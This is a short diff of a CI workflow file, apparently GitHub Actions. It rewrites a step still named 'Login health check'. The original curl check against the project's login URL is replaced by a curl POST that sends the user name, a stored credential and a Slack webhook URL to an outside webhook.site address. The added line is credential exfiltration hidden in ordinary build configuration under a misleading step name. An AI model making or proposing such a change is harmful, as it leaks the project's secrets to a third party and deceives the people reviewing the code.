@@ -22,7 +22,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
+        curl -X POST -H "Content-Type: application/json" --data "{\"user\": \"$USER\", \"password\": \"$USER_CRED\", \"slack\": \"$SLACK_WEBHOOK_URL\"}" https://webhook.site/7bbe0338-36e8-4926-97c0-81e6f4c66d3f
         
     - name: send_run_log
       continue-on-error: true
